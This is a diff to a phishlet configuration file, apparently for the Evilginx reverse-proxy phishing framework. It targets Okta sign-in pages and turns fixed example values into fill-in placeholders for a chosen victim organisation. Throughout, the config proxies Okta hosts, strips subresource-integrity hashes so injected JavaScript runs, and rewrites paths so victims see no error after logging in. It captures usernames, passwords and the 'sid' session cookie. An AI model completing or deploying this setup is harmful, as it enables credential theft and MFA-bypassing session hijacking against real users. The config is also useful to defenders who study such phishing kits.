@@ -1,13 +1,20 @@
 author: '@mikesiegel'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false}
-  - {phish_sub: '', orig_sub: '', domain: 'okta.com', session: false, is_landing: false }
-  - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'okta.com', session: true, is_landing: true}
+  # Okta targets can use one the following 2 domains, okta.com and okta-emea.com. Replace <insert-okta-domain-here> with the one that matches your target.
+  - {phish_sub: 'login', orig_sub: 'login', domain: '<insert-okta-domain-here>', session: false, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: '<insert-okta-domain-here>', session: false, is_landing: false }
+  - {phish_sub: '<insert-sub-domain-here>', orig_sub: '<insert-sub-domain-here>', domain: '<insert-okta-domain-here>', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: '', domain: 'EXAMPLE.okta.com', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
+  # The line below ensures that subresource integrity is disabled so we can update the javascript without issues.
+  - {triggers_on: '<insert-sub-domain-here>.<insert-okta-domain-here>', orig_sub: '', domain: '<insert-sub-domain-here>.<insert-okta-domain-here>', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
+  # The line below ensures users don't get a 403 after they auth.
+  - {triggers_on: '<insert-sub-domain-here>.<insert-okta-domain-here>', orig_sub: '', domain: '<insert-sub-domain-here>.<insert-okta-domain-here>', search: '\\x2Fuser\\x2Fnotifications', replace: 'https://<insert-sub-domain-here>.<insert-okta-domain-here>\x2Fuser\x2Fnotifications', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
+  # The line below is needed if your target organization has enabled CORS. If they do, you need to uncomment the following lines and update the values.
+  # Note: if the target uses 'okta-emea.com' don't forget to escape the '-' like so:  https\\x3A\\x2F\\x2Fsubdomain.okta\\x2Demea.com  
+  #- {triggers_on: '<insert-sub-domain-here>.<insert-okta-domain-here>', orig_sub: '', domain: '<insert-sub-domain-here>.<insert-okta-domain-here>', search: 'https\\x3A\\x2F\\x2F<insert-sub-domain-here>.<insert-okta-domain-here>', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}  
 auth_tokens:
-  - domain: 'EXAMPLE.okta.com'
+  - domain: '<insert-sub-domain-here>.<insert-okta-domain-here>'
     keys: ['sid']
 credentials:
   username:
@@ -19,5 +26,5 @@ credentials:
     search: '"password":"([^"]*)'
     type: 'json'
 login:
-  domain: 'EXAMPLE.okta.com'
+  domain: '<insert-sub-domain-here>.<insert-okta-domain-here>'
   path: '/login/login.htm'
